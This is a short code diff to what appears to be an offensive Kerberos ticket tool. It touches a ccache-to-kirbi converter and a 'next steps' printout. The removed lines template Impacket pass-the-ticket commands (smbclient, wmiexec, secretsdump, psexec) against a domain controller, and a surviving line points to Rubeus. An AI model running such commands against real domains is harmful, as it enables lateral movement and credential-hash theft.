@@ -286,7 +286,6 @@ def inspect_ticket(ccache_path):
 
 
 def convert_ccache_to_kirbi(ccache_path, out_path):
-    """Built-in ccache to kirbi converter. No external ticketConverter.py needed."""
     if not os.path.exists(ccache_path):
         print(f"[-] Source file not found: {ccache_path}")
         return False
@@ -545,10 +544,6 @@ def print_next_steps(username, domain, dc_ip):
     print(f"    export KRB5CCNAME={ccache_file}")
     print()
     print(" Impacket examples (after export):")
-    print(f"    smbclient.py -k -no-pass {domain}/{username}@{dc_ip}")
-    print(f"    wmiexec.py -k -no-pass {domain}/{username}@{dc_ip}")
-    print(f"    secretsdump.py -k -no-pass {domain}/{username}@{dc_ip}")
-    print(f"    psexec.py -k -no-pass {domain}/{username}@{dc_ip}")
     print()
     print(" Windows / Rubeus:")
     print(f"    Convert to kirbi first, then use with Rubeus")
